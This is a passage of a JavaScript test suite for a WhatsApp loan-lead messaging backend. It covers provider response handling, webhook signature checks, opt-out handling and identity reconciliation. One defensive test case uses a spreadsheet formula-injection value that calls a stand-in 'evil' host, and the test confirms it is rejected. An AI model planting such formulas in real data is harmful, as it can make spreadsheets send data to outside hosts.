    assert.equal(txtRes.persistenceState, 'PERSISTED');
    assert.equal(txtRes.messageId, 'wamid.valid_txt_01');
    assert.equal(txtRes.eventId, 'MSG_META_wamid.valid_txt_01');

    const tplRes = await aisensy.sendAiSensyWhatsApp(
      { destination: AUTH_PHONE_E164, userName: 'Sachin', templateName: 'avani_loan_intro_v2', templateParams: ['Sachin'], customerId: 'CUST-9175635165' },
      'corr_tpl'
    );
    assert.equal(tplRes.success, true);
    assert.equal(tplRes.persisted, true);
    assert.equal(tplRes.messageId, 'wamid.valid_tpl_01');
    assert.equal((await messageEventRepository.findByProviderMessageId('wamid.valid_tpl_01', 'Meta')).message_type, 'TEMPLATE');
  });

  it('C02: Meta HTTP 200 with missing/empty/malformed messages or id NEVER fabricates meta_<ts> and returns UNKNOWN_PROVIDER_OUTCOME', async () => {
    const malformedPayloads = [
      { label: 'missing messages', data: { unexpected: true } },
      { label: 'empty messages', data: { messages: [] } },
      { label: 'missing id', data: { messages: [{}] } },
      { label: 'empty id', data: { messages: [{ id: '   ' }] } },
      { label: 'malformed id with spaces', data: { messages: [{ id: 'bad wamid value' }] } },
      { label: 'formula-prefixed id', data: { messages: [{ id: '=IMPORTXML("http://evil","//a")' }] } },
      { label: 'fabricated timestamp id', data: { messages: [{ id: 'meta_1795216644632' }] } }
    ];

    for (const [idx, tc] of malformedPayloads.entries()) {
      axios.post = async () => ({ status: 200, data: tc.data });
      const res = await aisensy.sendAiSensyWhatsApp(
        { destination: AUTH_PHONE_E164, userName: 'Sachin', text: 'Test', customerId: 'CUST-9175635165', correlationId: `CORR-BAD-${idx}` },
        `corr_bad_${idx}`
      );
      assert.equal(res.success, false, `[${tc.label}] must NOT report success:true`);
      assert.equal(res.persisted, false, `[${tc.label}] must NOT report persisted:true`);
      assert.equal(res.status, 'UNKNOWN_PROVIDER_OUTCOME', `[${tc.label}] must mark ambiguous outcome`);
      assert.equal(res.providerOutcome, 'UNKNOWN_PROVIDER_OUTCOME');
      assert.equal(res.persistenceState, 'UNKNOWN_PROVIDER_OUTCOME');
      assert.equal(res.retryable, false, `[${tc.label}] must NOT blindly retry ambiguous send`);
      assert.equal(res.reconciliationRequired, true);
      assert.equal(res.messageId, undefined, `[${tc.label}] must NOT fabricate messageId`);
    }

    const allRows = await messageEventRepository.findAll();
    for (const row of allRows) {
      assert.equal(/^meta_\d{10,}$/.test(row.provider_message_id), false, 'Zero fabricated meta_<ts> rows allowed');
      assert.notEqual(row.delivery_status, 'SENT', 'Ambiguous outcome must NEVER be persisted as SENT');
    }
  });

  it('C03: Meta HTTP 400, 401, 429, and 500 classify PROVIDER_REJECTED with accurate retryability and zero false persistence', async () => {
    const cases = [
      { status: 400, retryable: false },
      { status: 401, retryable: false },
      { status: 429, retryable: true },
      { status: 500, retryable: true }
    ];
    for (const tc of cases) {
      axios.post = async () => {
        const e = new Error(`Meta HTTP ${tc.status}`);
        e.response = { status: tc.status, data: { error: { message: `HTTP ${tc.status} error` } } };
        throw e;
      };
      const res = await aisensy.sendAiSensyWhatsApp(
        { destination: AUTH_PHONE_E164, userName: 'Sachin', text: 'Test', customerId: 'CUST-9175635165' },
        `corr_http_${tc.status}`
      );
      assert.equal(res.success, false);
      assert.equal(res.persisted, false);
      assert.equal(res.providerOutcome, 'PROVIDER_REJECTED');
      assert.equal(res.persistenceState, 'PROVIDER_REJECTED');
      assert.equal(res.httpStatus, tc.status);
      assert.equal(res.retryable, tc.retryable);
    }
  });

  it('C04: Meta network timeout and response timeout after possible acceptance mark UNKNOWN_PROVIDER_OUTCOME without blind resend', async () => {
    for (const errObj of [
      Object.assign(new Error('timeout of 10000ms exceeded'), { code: 'ECONNABORTED' }),
      Object.assign(new Error('socket read timeout'), { code: 'ETIMEDOUT' })
    ]) {
      axios.post = async () => { throw errObj; };
      const res = await aisensy.sendAiSensyWhatsApp(
        { destination: AUTH_PHONE_E164, userName: 'Sachin', text: 'Timeout test', customerId: 'CUST-9175635165' },
        'corr_timeout'
      );
      assert.equal(res.success, false);
      assert.equal(res.persisted, false);
      assert.equal(res.status, 'WEBHOOK_TIMEOUT');
      assert.equal(res.providerOutcome, 'UNKNOWN_PROVIDER_OUTCOME');
      assert.equal(res.persistenceState, 'UNKNOWN_PROVIDER_OUTCOME');
      assert.equal(res.retryable, false, 'Timeout after possible acceptance MUST NOT blindly resend');
      assert.equal(res.reconciliationRequired, true);
    }
  });

  it('C05: Google Sheets persistence failure after Meta acceptance separates providerAccepted=true from persisted=false', async () => {
    axios.post = async () => {
      configureMockSheetsFaults({ forceUnavailable: true });
      return { status: 200, data: { messages: [{ id: 'wamid.accepted_sheets_down' }] } };
    };
    const res = await aisensy.sendAiSensyWhatsApp(
      { destination: AUTH_PHONE_E164, userName: 'Sachin', text: 'Hi', customerId: 'CUST-9175635165' },
      'corr_sheets_down'
    );
    assert.equal(res.success, false);
    assert.equal(res.providerAccepted, true);
    assert.equal(res.persisted, false);
    assert.equal(res.persistenceFailed, true);
    assert.equal(res.persistenceState, 'PERSISTENCE_FAILED');
    assert.equal(res.messageId, 'wamid.accepted_sheets_down');
    assert.equal(res.retryable, false, 'Already accepted by Meta; reconcile CRM persistence rather than resending');
  });

  it('C06: AiSensy, OmniDM, and ChatMitra live HTTP 200 missing valid IDs fail closed without fabricated timestamp IDs', async () => {
    // ChatMitra live missing ID
    axios.post = async () => ({ status: 200, data: { ok: true } });
    const cmRes = await chatmitra.sendChatMitraMessage({
      toPhone: AUTH_PHONE_E164,
      messageText: 'Hello from ChatMitra',
      correlationId: 'CORR-CM-BAD200'
    });
    assert.equal(cmRes.success, false);
    assert.equal(cmRes.status, 'UNKNOWN_PROVIDER_OUTCOME');
    assert.equal(cmRes.persistenceState, 'UNKNOWN_PROVIDER_OUTCOME');
    assert.equal(cmRes.retryable, false);
    assert.equal(cmRes.messageId, undefined);

    // AiSensy template missing submitted_message_id
    process.env.AISENCY_WABA_API_KEY = 'TEST_AISENSY_KEY';
    axios.post = async () => ({ status: 200, data: { success: true } });
    const aiRes = await aisensy.sendAiSensyWhatsApp(
      { destination: AUTH_PHONE_E164, userName: 'Sachin', templateName: 'avani_loan_intro_v2', customerId: 'CUST-9175635165' },
      'corr_aisensy_bad'
    );
    assert.equal(aiRes.success, false);
    assert.equal(aiRes.persisted, false);
    assert.equal(aiRes.persistenceState, 'UNKNOWN_PROVIDER_OUTCOME');
    assert.equal(aiRes.messageId, undefined);
    delete process.env.AISENCY_WABA_API_KEY;

    // OmniDM missing id
    process.env.OMNIDIM_API_KEY = 'TEST_OMNI_KEY';
    axios.post = async () => ({ status: 200, data: { status: 'queued' } });
    const omniRes = await aisensy.sendAiSensyWhatsApp(
      { destination: AUTH_PHONE_E164, userName: 'Sachin', text: 'Omni', customerId: 'CUST-9175635165' },
      'corr_omni_bad'
    );
    assert.equal(omniRes.success, false);
    assert.equal(omniRes.persisted, false);
    assert.equal(omniRes.persistenceState, 'UNKNOWN_PROVIDER_OUTCOME');
    assert.equal(omniRes.messageId, undefined);
  });
});

// ============================================================================
// GROUP D — D-03 & R-07/H-01 WORKER CONTRACT & PROVIDER IDENTITY HARDENING
// ============================================================================
describe('Group D — D-03 Worker Contract & R-07/H-01 Provider Identity Hardening', () => {
  const origAxiosPost = axios.post;
  let envSnap;

  beforeEach(() => { envSnap = snapshotEnv(); setupDefaultTestEnv(); });
  afterEach(() => { axios.post = origAxiosPost; restoreEnv(envSnap); });

  it('D01: Worker rejects missing, empty, and unknown provider with HTTP 400 INVALID_PROVIDER (zero silent ChatMitra default)', async () => {
    for (const badProvider of [undefined, '', '   ', 'RandomProvider']) {
      const resp = await workerRoute.POST(
        makeWorkerRequest({
          eventId: `EVT_BAD_PROV_${String(badProvider)}`,
          eventType: 'INBOUND_MESSAGE',
          provider: badProvider,
          data: { fromPhone: AUTH_PHONE_E164, msgId: 'm1', message: { type: 'text', text: { body: 'Hi' } } }
        })
      );
      assert.equal(resp.status, 400);
      const data = await resp.json();
      assert.equal(data.success, false);
      assert.equal(data.persisted, false);
      assert.equal(data.error, 'INVALID_PROVIDER');
    }
    assert.equal((await messageEventRepository.findAll()).length, 0);
  });

  it('D02: Worker rejects DIRECT_DISPATCH and unknown eventType with HTTP 400 UNSUPPORTED_EVENT and zero rows written', async () => {
    for (const badType of ['DIRECT_DISPATCH', 'NO_OP_TEST', '', undefined]) {
      const resp = await workerRoute.POST(
        makeWorkerRequest({
          eventId: `EVT_BAD_TYPE_${String(badType)}`,
          eventType: badType,
          provider: 'Meta',
          correlationId: 'CORR-UNSUP',
          data: {}
        })
      );
      assert.equal(resp.status, 400);
      const data = await resp.json();
      assert.equal(data.success, false);
      assert.equal(data.persisted, false);
      assert.equal(data.persistenceState, 'UNSUPPORTED_EVENT');
      assert.equal(data.error, 'UNSUPPORTED_EVENT');
    }
    assert.equal((await messageEventRepository.findAll()).length, 0);
  });

  it('D03: Worker rejects STATUS_UPDATE missing msgId/statusStr with HTTP 400 and marks WEBHOOK_EVENTS FAILED', async () => {
    const resp = await workerRoute.POST(
      makeWorkerRequest({
        eventId: 'META_STATUS_EMPTY_1',
        eventType: 'STATUS_UPDATE',
        provider: 'Meta',
        data: { msgId: '', statusStr: '' }
      })
    );
    assert.equal(resp.status, 400);
    const data = await resp.json();
    assert.equal(data.success, false);
    assert.equal(data.persisted, false);
    assert.equal(data.error, 'INVALID_STATUS_PAYLOAD');
    const wh = await webhookEventRepository.findById('META_STATUS_EMPTY_1');
    assert.equal(wh.processing_status, 'FAILED');
  });

  it('D04: MEDIA_IGNORED returns persisted:false for unregistered sender and persisted:true for verified customer with zero documents stored', async () => {
    const unregResp = await workerRoute.POST(
      makeWorkerRequest({
        eventId: 'META_MEDIA_UNREG_01',
        eventType: 'INBOUND_MESSAGE',
        provider: 'Meta',
        data: {
          fromPhone: '+919800001122',
          msgId: 'wamid.media_unreg_01',
          message: { type: 'document', id: 'wamid.media_unreg_01', document: { id: 'secret_doc_1' } }
        }
      })
    );
    assert.equal(unregResp.status, 200);
    const unregData = await unregResp.json();
    assert.equal(unregData.mediaRejected, true);
    assert.equal(unregData.documentCreated, false);
    assert.equal(unregData.persistenceState, 'IGNORED_MEDIA');
    assert.equal(unregData.persisted, false, 'Unregistered sender media MUST NOT claim persisted:true');
    assert.equal(unregData.identityPending, true);

    await seedCustomer({ customer_id: 'CUST-MEDIA-REG', mobile_number: '+919800001133' });
    const regResp = await workerRoute.POST(
      makeWorkerRequest({
        eventId: 'META_MEDIA_REG_01',
        eventType: 'INBOUND_MESSAGE',
        provider: 'Meta',
        data: {
          fromPhone: '+919800001133',
          msgId: 'wamid.media_reg_01',
          message: { type: 'image', id: 'wamid.media_reg_01' }
        }
      })
    );
    assert.equal(regResp.status, 200);
    const regData = await regResp.json();
    assert.equal(regData.persisted, true);
    assert.equal(regData.persistenceState, 'IGNORED_MEDIA');
    assert.equal(regData.customerId, 'CUST-MEDIA-REG');
  });

  it('D05: Worker enforces persisted===true on outbound AI reply (fails closed 503 when non-live gateway returns persisted:false)', async () => {
    const vmHarness = createGatewayVmHarness();
    const origFetch = globalThis.fetch;
    try {
      process.env.GOOGLE_SHEETS_TRANSPORT_MODE = 'APPS_SCRIPT_GATEWAY';
      delete process.env.GOOGLE_SHEETS_ENABLE_MOCK;
      process.env.GOOGLE_SHEETS_GATEWAY_URL = 'https://script.google.com/macros/s/d05-vm/exec';
      process.env.GOOGLE_SHEETS_GATEWAY_SECRET = TEST_GATEWAY_SECRET;
      process.env.PROVIDER_MODE = 'mock';
      globalThis.fetch = vmHarness.gatewayFetch;

      const resp = await workerRoute.POST(
        makeWorkerRequest({
          eventId: 'META_INBOUND_NONLIVE_GW_01',
          eventType: 'INBOUND_MESSAGE',
          provider: 'Meta',
          data: {
            fromPhone: AUTH_PHONE_E164,
            msgId: 'wamid.nonlive_gw_01',
            profileName: 'Gateway Mock Test',
            message: { type: 'text', text: { body: 'I want a Home Loan' }, id: 'wamid.nonlive_gw_01' }
          }
        })
      );
      assert.equal(resp.status, 503, 'Worker MUST fail closed 503 when outbound adapter returns persisted:false');
      const data = await resp.json();
      assert.equal(data.success, false);
      assert.equal(data.persisted, false);
      assert.equal(data.persistenceState, 'PERSISTENCE_FAILED');
    } finally {
      globalThis.fetch = origFetch;
    }
  });

  it('D06: R-07/H-01 provider identity hardening: unscoped lookup removed, canonical prioritized over legacy, ambiguous/blank legacy fail closed, oversized ID hashed', async () => {
    // Single-provider row MUST still reject unscoped lookup (no permissive single-row fallback!)
    await messageEventRepository.recordMessageEvent({
      customer_id: 'CUST-9175635165',
      provider: 'ChatMitra',
      message_type: 'TEXT',
      direction: 'outbound',
      delivery_status: 'SENT',
      provider_message_id: 'single_prov_id_01'
    });
    await assert.rejects(
      () => messageEventRepository.findByProviderMessageId('single_prov_id_01'),
      (err) => err instanceof SheetsCrmError && err.code === 'GOOGLE_SHEETS_VALIDATION_FAILED'
    );

    // Oversized ID >180 chars deterministically hashed for event_id while preserving raw provider_message_id
    const longId = 'wamid.' + 'X'.repeat(210);
    const longWrite = await messageEventRepository.recordMessageEvent({
      customer_id: 'CUST-9175635165',
      provider: 'Meta',
      message_type: 'TEXT',
      direction: 'outbound',
      delivery_status: 'SENT',
      provider_message_id: longId
    });
    assert.ok(longWrite.record.event_id.startsWith('MSG_META_'));
    assert.ok(longWrite.record.event_id.length < 100);
    assert.equal(longWrite.record.provider_message_id, longId);

    // Blank-provider legacy row MUST NOT match Meta or ChatMitra
    await sheets.defaultSheetsClient.upsertRow('MESSAGE_EVENTS', {
      event_id: 'MSG_legacy_blank_01',
      customer_id: 'CUST-9175635165',
      provider: '',
      message_type: 'TEXT',
      direction: 'outbound',
      delivery_status: 'SENT',
      provider_message_id: 'legacy_blank_01',
      event_timestamp: new Date().toISOString()
    });
    assert.equal(await messageEventRepository.findByProviderMessageId('legacy_blank_01', 'Meta'), null);
    assert.equal(await messageEventRepository.findByProviderMessageId('legacy_blank_01', 'ChatMitra'), null);

    // Ambiguous duplicate rows for same provider fail closed
    await sheets.defaultSheetsClient.upsertRow('MESSAGE_EVENTS', {
      event_id: 'MSG_CUSTOM_A_ambig_1',
      customer_id: 'CUST-9175635165',
      provider: 'Meta',
      message_type: 'TEXT',
      direction: 'outbound',
      delivery_status: 'SENT',
      provider_message_id: 'ambig_1',
      event_timestamp: new Date().toISOString()
    });
    await sheets.defaultSheetsClient.upsertRow('MESSAGE_EVENTS', {
      event_id: 'MSG_CUSTOM_B_ambig_1',
      customer_id: 'CUST-9175635165',
      provider: 'Meta',
      message_type: 'TEXT',
      direction: 'outbound',
      delivery_status: 'DELIVERED',
      provider_message_id: 'ambig_1',
      event_timestamp: new Date().toISOString()
    });
    await assert.rejects(
      () => messageEventRepository.findByProviderMessageId('ambig_1', 'Meta'),
      (err) => err instanceof SheetsCrmError && err.code === 'GOOGLE_SHEETS_VALIDATION_FAILED'
    );
  });

  it('D07: Opt-out from unauthorized live number saves opt-out durably and returns HTTP 200 without 502 retry storm', async () => {
    const resp = await workerRoute.POST(
      makeWorkerRequest({
        eventId: 'META_OPTOUT_CLAMP_01',
        eventType: 'INBOUND_MESSAGE',
        provider: 'Meta',
        correlationId: 'CORR-CLAMP-1',
        data: {
          fromPhone: '+919822776655',
          msgId: 'wamid.optout_clamp_01',
          profileName: 'Unauthorized Sender',
          message: { type: 'text', text: { body: 'STOP' }, id: 'wamid.optout_clamp_01' }
        }
      })
    );
    assert.equal(resp.status, 200);
    const data = await resp.json();
    assert.equal(data.optedOut, true);
    assert.equal(data.outboundDispatched, false);
    assert.equal(data.outboundSuppressedReason, 'BLOCKED_UNAUTHORIZED_LIVE_RECIPIENT');
    assert.equal((await webhookEventRepository.findById('META_OPTOUT_CLAMP_01')).processing_status, 'COMPLETED');
  });
});

// ============================================================================
// GROUP E — SECTION 9 DURABLE CUSTOMER IDENTITY RETRY & RECONCILIATION
// ============================================================================
describe('Group E — Durable Customer Identity Retry & Reconciliation (Zero Schema Change)', () => {
  let envSnap;
  beforeEach(() => { envSnap = snapshotEnv(); setupDefaultTestEnv(); });
  afterEach(() => restoreEnv(envSnap));

  it('E01: Unresolved STATUS_UPDATE stages scoped UNRESOLVED marker + PII-free SYSTEM_CONFIG checkpoint', async () => {
    const resp = await workerRoute.POST(
      makeWorkerRequest({
        eventId: 'META_STATUS_RECON_01',
        eventType: 'STATUS_UPDATE',
        provider: 'Meta',
        correlationId: 'CORR-RECON-01',
        data: { msgId: 'wamid.recon_01', statusStr: 'delivered', fromPhone: AUTH_PHONE_E164 }
      })
    );
    assert.equal(resp.status, 503);
    const data = await resp.json();
    assert.equal(data.persistenceState, 'PENDING_CUSTOMER_IDENTITY');
    assert.ok(data.customerId.startsWith('UNRESOLVED_META_'));

    const cfgKey = buildReconciliationConfigKey('MSG_META_wamid.recon_01');
    const cfgRow = await systemConfigRepository.findById(cfgKey);
    assert.ok(cfgRow, 'Durable checkpoint MUST be written in canonical SYSTEM_CONFIG tab');
    assert.ok(cfgRow.config_value.length <= 240);
    assert.equal(cfgRow.config_value.includes('9175635165'), false, 'Zero raw phone numbers in SYSTEM_CONFIG');
    assert.equal(cfgRow.config_value.includes('5165'), false, 'Zero raw phone tails in SYSTEM_CONFIG');

    const diag = await getReconciliationDiagnostics();
    assert.equal(diag.pending, 1);
    assert.equal(diag.unresolvedMessageEvents, 1);
    assert.equal(JSON.stringify(diag).includes('9175635165'), false);
  });

  it('E02: Bounded backoff defers not-due retries, then reconciles in-place once customer exists with zero duplicates and zero outbound resends', async () => {
    const t0 = 1_800_000_000_000;
    await messageEventRepository.recordMessageEvent({
      event_id: 'MSG_META_wamid.recon_lifecycle_01',
      customer_id: buildScopedUnresolvedCustomerId('Meta', 'wamid.recon_lifecycle_01', 'CORR-LC'),
      provider: 'Meta',
      message_type: 'TEXT',
      direction: 'outbound',
      delivery_status: 'DELIVERED',
      provider_message_id: 'wamid.recon_lifecycle_01'
    });
    await webhookEventRepository.registerWebhookEventIdempotent({
      event_id: 'META_STATUS_LC_01',
      provider: 'Meta',
      event_type: 'STATUS_UPDATE',
      rawPayloadForHashOnly: { id: 'wamid.recon_lifecycle_01' }
    });
    await webhookEventRepository.markWebhookStatus({
      event_id: 'META_STATUS_LC_01',
      processing_status: 'FAILED',
      error_code: 'CUSTOMER_IDENTITY_UNRESOLVED'
    });
    await stagePendingIdentityReconciliation({
      messageEventId: 'MSG_META_wamid.recon_lifecycle_01',
      provider: 'Meta',
      providerMessageId: 'wamid.recon_lifecycle_01',
      fromPhone: AUTH_PHONE_E164,
      eventType: 'STATUS_UPDATE',
      webhookEventId: 'META_STATUS_LC_01',
      correlationId: 'CORR-LC',
      nowMs: t0
    });

    // Attempt 1 (customer still missing) -> RETRYING with backoff
    const run1 = await reconcilePendingMessageIdentities({
      nowMs: t0 + 1000,
      baseDelayMs: 60_000,
      jitterRatio: 0,
      maxAttempts: 3
    });
    assert.equal(run1.retrying, 1);
    assert.equal(run1.reconciled, 0);
    assert.equal(run1.outboundResent, 0);

    // Attempt before backoff expires -> skippedNotDue
    const runTooEarly = await reconcilePendingMessageIdentities({
      nowMs: t0 + 30_000,
      baseDelayMs: 60_000,
      jitterRatio: 0,
      maxAttempts: 3
    });
    assert.equal(runTooEarly.skippedNotDue, 1);

    // Customer now created (with opted-out consent -> must NOT bypass consent!)
    const cust = await seedCustomer({ customer_id: 'CUST-RECON-VERIFIED', mobile_number: AUTH_PHONE_E164 });
    await consentRepository.upsertConsent({
      customer_id: cust.customer_id,
      channel: 'WHATSAPP',
      consent_status: 'WITHDRAWN',
      consent_source: 'WHATSAPP_OPTOUT',
      optout_status: 'OPTED_OUT'
    });

    // Attempt after backoff -> reconciles in-place!
    const run2 = await reconcilePendingMessageIdentities({
      nowMs: t0 + 120_000,
      baseDelayMs: 60_000,
      jitterRatio: 0,
      maxAttempts: 3
    });
    assert.equal(run2.reconciled, 1);
    assert.equal(run2.outboundResent, 0, 'Reconciliation MUST NEVER trigger duplicate outbound sends');

    const allMsgs = await messageEventRepository.findAll();
    assert.equal(allMsgs.length, 1, 'Reconciled in place with ZERO duplicate rows');
    assert.equal(allMsgs[0].event_id, 'MSG_META_wamid.recon_lifecycle_01');
    assert.equal(allMsgs[0].customer_id, 'CUST-RECON-VERIFIED');

    const whAfter = await webhookEventRepository.findById('META_STATUS_LC_01');
    assert.equal(whAfter.processing_status, 'COMPLETED');
    assert.equal(whAfter.error_code, 'RECONCILED_OPTED_OUT');

    // Subsequent run is strictly idempotent (zero rescans)
    const run3 = await reconcilePendingMessageIdentities({ nowMs: t0 + 200_000 });
    assert.equal(run3.scanned, 0);
  });

  it('E03: Exhausted reconciliation retries transition durably to terminal dead-letter EXHAUSTED', async () => {
    const t0 = 1_800_000_000_000;
    await messageEventRepository.recordMessageEvent({
      event_id: 'MSG_META_wamid.exhaust_01',
      customer_id: buildScopedUnresolvedCustomerId('Meta', 'wamid.exhaust_01', 'CORR-EX'),
      provider: 'Meta',
      message_type: 'TEXT',
      direction: 'outbound',
      delivery_status: 'SENT',
      provider_message_id: 'wamid.exhaust_01'
    });
    await stagePendingIdentityReconciliation({
      messageEventId: 'MSG_META_wamid.exhaust_01',
      provider: 'Meta',
      providerMessageId: 'wamid.exhaust_01',
      fromPhone: '+919899998888',
      eventType: 'OUTBOUND_SEND',
      correlationId: 'CORR-EX',
      nowMs: t0
    });

    const r1 = await reconcilePendingMessageIdentities({ nowMs: t0 + 1000, baseDelayMs: 1000, jitterRatio: 0, maxAttempts: 2 });
    assert.equal(r1.retrying, 1);

    const r2 = await reconcilePendingMessageIdentities({ nowMs: t0 + 10_000, baseDelayMs: 1000, jitterRatio: 0, maxAttempts: 2 });
    assert.equal(r2.exhausted, 1);

    const diag = await getReconciliationDiagnostics();
    assert.equal(diag.exhausted, 1);
    assert.equal(diag.pending, 0);
    assert.equal(diag.retrying, 0);
  });

  it('E04: Concurrent reconciliation runners prevent simultaneous double-processing via in-flight guard', async () => {
    const t0 = 1_800_000_000_000;
    await seedCustomer({ customer_id: 'CUST-CONC-1', mobile_number: AUTH_PHONE_E164 });
    await messageEventRepository.recordMessageEvent({
      event_id: 'MSG_META_wamid.conc_01',
      customer_id: buildScopedUnresolvedCustomerId('Meta', 'wamid.conc_01', 'CORR-C'),
      provider: 'Meta',
      message_type: 'TEXT',
      direction: 'outbound',
      delivery_status: 'SENT',
      provider_message_id: 'wamid.conc_01'
    });
    await stagePendingIdentityReconciliation({
      messageEventId: 'MSG_META_wamid.conc_01',
      provider: 'Meta',
      providerMessageId: 'wamid.conc_01',
      fromPhone: AUTH_PHONE_E164,
      eventType: 'OUTBOUND_SEND',
      correlationId: 'CORR-C',
      nowMs: t0
    });

    let releaseFirst;
    const holdPromise = new Promise((resolve) => { releaseFirst = resolve; });
    const firstRunPromise = reconcilePendingMessageIdentities({
      nowMs: t0 + 1000,
      beforeCommitHook: async () => { await holdPromise; }
    });
    await new Promise((r) => setTimeout(r, 10));

    const secondRun = await reconcilePendingMessageIdentities({ nowMs: t0 + 1000 });
    releaseFirst();
    const firstRun = await firstRunPromise;

    assert.equal(firstRun.reconciled, 1);
    assert.equal(secondRun.skippedInFlight, 1, 'Second concurrent worker MUST skip in-flight event');
    assert.equal(secondRun.reconciled, 0);
  });
});

// ============================================================================
// GROUP F — META E2E (SECTION 12) & CHATMITRA E2E (SECTION 13) LOCAL CONTRACTS
// ============================================================================
describe('Group F — Meta & ChatMitra End-to-End Local Source Contracts', () => {
  const origFetch = globalThis.fetch;
  const origAxiosPost = axios.post;
  const origAiProcess = aiAgentMod.AgentEngine.processMessage;
  let envSnap;

  beforeEach(() => { envSnap = snapshotEnv(); setupDefaultTestEnv(); });
  afterEach(() => {
    globalThis.fetch = origFetch;
    axios.post = origAxiosPost;
    aiAgentMod.AgentEngine.processMessage = origAiProcess;
    restoreEnv(envSnap);
  });

  function wireLocalWorkerFetch() {
    globalThis.fetch = async (url, init) => {
      const wResp = await workerRoute.POST(
        new Request(url, { method: init.method, headers: init.headers, body: init.body })
      );
      return { ok: wResp.status >= 200 && wResp.status < 300, status: wResp.status, json: () => wResp.json() };
    };
  }

  it('F01: Meta E2E contract — signatures, AI reply, withdrawn consent, Hindi/Marathi opt-out, AI null/error, status SENT->DELIVERED->READ->FAILED & out-of-order', async () => {
    wireLocalWorkerFetch();

    // Missing & invalid signatures -> 401
    const metaPayload = (msgId, text) => ({
      object: 'whatsapp_business_account',
      entry: [{ changes: [{ value: { contacts: [{ profile: { name: 'Meta E2E User' } }], messages: [{ from: AUTH_PHONE_DIGITS, id: msgId, type: 'text', text: { body: text } }] } }] }]
    });
    assert.equal((await metaWebhookRoute.POST(makeMetaRequest(metaPayload('wamid.m_nosig', 'Hi'), { includeSig: false }))).status, 401);
    assert.equal((await metaWebhookRoute.POST(makeMetaRequest(metaPayload('wamid.m_badsig', 'Hi'), { sigOverride: 'sha256=' + '0'.repeat(64) }))).status, 401);

    // Valid inbound + AI auto-reply -> Meta outbound + MESSAGE_EVENTS persisted
    axios.post = async () => ({ status: 200, data: { messages: [{ id: 'wamid.meta_e2e_out_01' }] } });
    const okResp = await metaWebhookRoute.POST(makeMetaRequest(metaPayload('wamid.meta_e2e_in_01', 'Need a Doctor Loan in Pune')));
    assert.equal(okResp.status, 200);
    assert.equal((await okResp.json()).persisted, true);
    assert.ok(await messageEventRepository.findByProviderMessageId('wamid.meta_e2e_out_01', 'Meta'));

    // Status callbacks: DELIVERED -> READ -> out-of-order SENT -> duplicate READ -> FAILED
    const sendStatus = async (statusStr, suffix = '') => {
      const body = {
        object: 'whatsapp_business_account',
        entry: [{ changes: [{ value: { statuses: [{ id: 'wamid.meta_e2e_out_01', status: statusStr, recipient_id: AUTH_PHONE_DIGITS, _seq: suffix }] } }] }]
      };
      return metaWebhookRoute.POST(makeMetaRequest(body));
    };
    assert.equal((await sendStatus('delivered')).status, 200);
    assert.equal((await sendStatus('read')).status, 200);
    assert.equal((await sendStatus('sent')).status, 200);
    const dupRead = await sendStatus('read');
    assert.equal(dupRead.status, 200);
    assert.equal((await dupRead.json()).duplicate, true);
    assert.equal((await messageEventRepository.findByProviderMessageId('wamid.meta_e2e_out_01', 'Meta')).delivery_status, 'READ');
    assert.equal((await sendStatus('failed')).status, 200);
    assert.equal((await messageEventRepository.findByProviderMessageId('wamid.meta_e2e_out_01', 'Meta')).delivery_status, 'FAILED');

    // AI returns null -> fail closed (503 from webhook wrapping worker 500, zero outbound send)
    let sends = 0;
    axios.post = async () => { sends++; return { status: 200, data: { messages: [{ id: 'wamid.never' }] } }; };
    aiAgentMod.AgentEngine.processMessage = async () => ({ nextQuestion: null });
    assert.equal((await metaWebhookRoute.POST(makeMetaRequest(metaPayload('wamid.meta_ai_null', 'Personal Loan')))).status, 503);
    assert.equal(sends, 0);

    // AI throws exception -> fail closed, zero outbound send
    aiAgentMod.AgentEngine.processMessage = async () => { throw new Error('Gemini unavailable'); };
    assert.equal((await metaWebhookRoute.POST(makeMetaRequest(metaPayload('wamid.meta_ai_err', 'Personal Loan')))).status, 503);
    assert.equal(sends, 0);
    aiAgentMod.AgentEngine.processMessage = origAiProcess;

    // Hindi & Marathi opt-out via Meta webhook
    axios.post = async () => ({ status: 200, data: { messages: [{ id: 'wamid.meta_opt_ack_hi' }] } });
    assert.equal((await metaWebhookRoute.POST(makeMetaRequest(metaPayload('wamid.meta_opt_hi', 'रोकें')))).status, 200);
    const cust = await customerRepository.findByMobile(AUTH_PHONE_E164);
    assert.equal(cust.record_status, 'OPTED_OUT');

    // Withdrawn consent suppresses subsequent AI reply
    let postOptOutSends = 0;
    axios.post = async () => { postOptOutSends++; return { status: 200, data: { messages: [{ id: 'wamid.never2' }] } }; };
    assert.equal((await metaWebhookRoute.POST(makeMetaRequest(metaPayload('wamid.meta_post_opt', 'Home Loan')))).status, 200);
    assert.equal(postOptOutSends, 0);

    // Fresh Marathi opt-out
    resetMockSheetsStore();
    axios.post = async () => ({ status: 200, data: { messages: [{ id: 'wamid.meta_opt_ack_mr' }] } });
    assert.equal((await metaWebhookRoute.POST(makeMetaRequest(metaPayload('wamid.meta_opt_mr', 'थांबवा')))).status, 200);
    assert.equal((await customerRepository.findByMobile(AUTH_PHONE_E164)).record_status, 'OPTED_OUT');
  });

  it('F02: ChatMitra E2E contract — all HMAC header formats, unsupported provider, spoofed identity, AI/provider failures, EN/HI/MR opt-out, worker auth failure & zero duplicate outbound', async () => {
    wireLocalWorkerFetch();

    // Invalid & missing HMAC -> 401
    const cmInbound = (id, text, extra = {}) => ({
      event: 'message.received',
      id,
      from: AUTH_PHONE_DIGITS,
      name: 'ChatMitra User',
      text,
      ...extra
    });
    assert.equal((await chatmitraWebhookRoute.POST(makeChatMitraRequest(cmInbound('cm_no_sig', 'Hi'), { includeSig: false }))).status, 401);
    assert.equal((await chatmitraWebhookRoute.POST(makeChatMitraRequest(cmInbound('cm_bad_sig', 'Hi'), { sigOverride: 'deadbeef' }))).status, 401);

    // Unsupported provider rejected 400
    assert.equal((await chatmitraWebhookRoute.POST(makeChatMitraRequest(cmInbound('cm_bad_prov', 'Hi', { provider: 'Meta' })))).status, 400);

    // Supported signature header formats (plain x-webhook-signature, sha256= x-hub-signature-256, x-signature)
    let cmOutboundCalls = 0;
    axios.post = async () => {
      cmOutboundCalls++;
      return { status: 200, data: { id: `cm_out_live_${cmOutboundCalls}` } };
    };

    const rPlain = await chatmitraWebhookRoute.POST(
      makeChatMitraRequest(cmInbound('cm_sig_plain', 'Need a Home Loan'), { headerName: 'x-webhook-signature', prefix: '' })
    );
    assert.equal(rPlain.status, 200);
    await Promise.all(waitUntilPromises);
    assert.equal(cmOutboundCalls, 1);
